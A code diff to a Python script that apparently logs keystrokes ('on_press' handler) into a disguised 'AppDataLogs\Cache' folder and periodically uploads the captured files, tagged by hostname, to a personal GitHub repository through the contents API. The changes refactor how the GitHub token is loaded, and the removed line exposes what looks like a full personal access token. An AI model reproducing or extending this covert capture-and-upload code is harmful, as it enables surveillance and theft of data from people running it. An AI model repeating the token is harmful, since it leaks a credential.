@@ -14,10 +14,25 @@ DEVICE_NAME = socket.gethostname()
 SAVE_DIR = r"D:\AppDataLogs\Cache"
 os.makedirs(SAVE_DIR, exist_ok=True)
 
+# 优先从本地环境变量获取 Token，如果不存在则从本地 token.txt 文件读取
+def get_local_token():
+    env_token = os.environ.get("GITHUB_TOKEN")
+    if env_token:
+        return env_token.strip()
+    
+    token_file_path = os.path.join(SAVE_DIR, "token.txt")
+    if os.path.exists(token_file_path):
+        try:
+            with open(token_file_path, "r", encoding="utf-8") as f:
+                return f.read().strip()
+        except Exception:
+            pass
+    return ""
+
 GITHUB_CONFIG = {
     "username": "Bei18",
     "repo_name": "my-python-storage",
-    "token": "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",
+    "token": get_local_token(),
 }
 
 uploaded_files = set()
@@ -27,12 +42,21 @@ def upload_file_smart(file_path):
     if not os.path.exists(file_path):
         return False
 
+    # 动态保证 Token 最新的状态
+    token = GITHUB_CONFIG["token"] or get_local_token()
+    if not token:
+        return False
+
     file_name = os.path.basename(file_path)
+    # 忽略本地保存 Token 的文件，防止误上传到远程仓库
+    if file_name == "token.txt":
+        return False
+
     target_path = f"uploads/{DEVICE_NAME}/{file_name}"
 
     base_url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{target_path}"
     headers = {
-        "Authorization": f"Bearer {GITHUB_CONFIG['token']}",
+        "Authorization": f"Bearer {token}",
         "Accept": "application/vnd.github+json",
     }
 
@@ -146,7 +170,7 @@ def on_press(key):
 
 
 def main():
-    write_txt("启动", "远程代码加载成功，开始执行...")
+    write_txt("启动", "代码加载成功，开始执行...")
 
     upload_thread = threading.Thread(target=scheduled_upload_task, daemon=True)
     upload_thread.start()
@@ -162,5 +186,5 @@ def main():
     hotkey_listener.stop()
 
 
-# 启动主函数
-main()
+if __name__ == "__main__":
+    main()
